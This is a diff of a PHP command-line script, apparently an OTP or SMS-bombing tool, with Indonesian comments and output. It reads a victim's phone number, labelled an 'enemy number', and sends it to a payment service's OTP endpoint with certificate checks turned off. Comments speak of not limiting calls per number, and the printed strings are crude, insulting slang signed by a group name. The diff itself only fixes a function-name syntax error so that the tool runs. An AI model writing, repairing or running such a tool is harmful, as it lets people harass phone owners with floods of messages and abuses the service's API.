@@ -1,7 +1,7 @@
 <?php
 # echo "CallAndreas5"
 // Jangan Batasi Telpon Setiap Satu Nomor
-function send 10* ($phone){
+function send($phone){
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -17,7 +17,7 @@ function send 10* ($phone){
 echo "Lo Ngapain Di Script Gua Babi ? Jangan Tau Make Aja Babi Lu Tau Memek Gak ? Itu Kesukaan Gua Anjing ; SGBTEAM\n\n";
 echo "NomorMusuhAnjing\nLoTauInputGakBabi? : ";
 $nomor = trim(fgets(STDIN));
-$execute = send 10* ($nomor);
+$execute = send($nomor);
 print $execute;
 # echo "terkirim mampusssssd"
 ?>
